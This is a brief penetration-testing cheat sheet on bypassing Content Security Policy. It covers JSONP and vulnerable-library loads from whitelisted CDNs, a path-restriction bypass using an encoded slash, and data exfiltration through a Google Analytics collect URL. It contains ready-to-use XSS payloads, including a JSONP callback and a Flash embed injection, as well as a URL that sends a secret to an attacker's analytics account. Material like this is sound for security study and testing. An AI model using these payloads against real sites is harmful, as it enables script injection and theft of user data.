# Ways to bypass CSP

## Introduction

Content Security Policy (CSP) is an added layer of security that helps to detect and mitigate certain types of attacks, including Cross Site Scripting (XSS) and data injection attacks.

How do we circumvent CSP protections?

## Impact

Based on different scenarios, we can use different tricks to bypass it.

### Insecure CDN

If you discover that CSP is allowing you to load js files from insecure CDN, you can include older version of vulnerable libraries to achieve your goals.

Some insecure CDN:

- [Google CDN](https://ajax.googleapis.com/ajax/)
    - `<script src="https://ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert&context=1337"></script>`
    - [Libraries](https://ajax.googleapis.com/ajax/libs)
        - Vulnerable Flash: `<embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e){alert(1337)}//' allowscriptaccess=always>`
- [CloudFlare CDN](https://cdnjs.cloudflare.com/ajax/)
- [jsDelivr](https://cdn.jsdelivr.net/)

### Path Restriction

When you see something like this:

```
Content-Security-Policy: default-src 'none'; style-src 'self'; img-src 'self'; script-src https://cdnjs.cloudflare.com/ajax/libs/jquery/
```

You think: Oh, would I only be allowed to include the js files of trusted CDN under the path `/ajax/libs/jquery/`?

The answer is "No", and you can bypass it via "URL Encoding of a slash". [Demo](https://t.co/Dl9hkKtlQc?amp=1)

![](https://pbs.twimg.com/media/ECK1OQNXoAA7qk-?format=jpg&name=large)

### Google Analytics

When you see something like this:

```
Content-Security-Policy: img-src 'self' data: www.google-analytics.com
```

Not a problem. Quoted from the original report from hackerone:

> The Google Analytics’ ea parameter is used to log event actions and can contain arbitrary strings. An attacker could setup a Google Analytics account and then inject an image referencing their account.

The exploit would be like: `https://www.google-analytics.com/collect?v=1&tid=UA-77300477-1&cid=2111515817&t=event&ec=email&el=2111515817&cs=newsletter&cm=email&cn=062413&cm1=1&ea={SECRET}`

## Reference

- [H5SC Minichallenge 3: "Sh*t, it's CSP!"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh*t,-it%27s-CSP!%22)
- [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/Intruders/jsonp_endpoint.txt)
- [Relative Path Overwrite demo](https://www.bmoine.fr/assets/projects/files/rpo/index.html)
- [@SecurityMB](https://twitter.com/SecurityMB/status/1162690916722839552)
- [@0daylabs](https://twitter.com/0daylabs/status/774293505183055872)
- [Google Analytics could be used as CSP bypass for data exfiltration on hackerone.com](https://hackerone.com/reports/199779)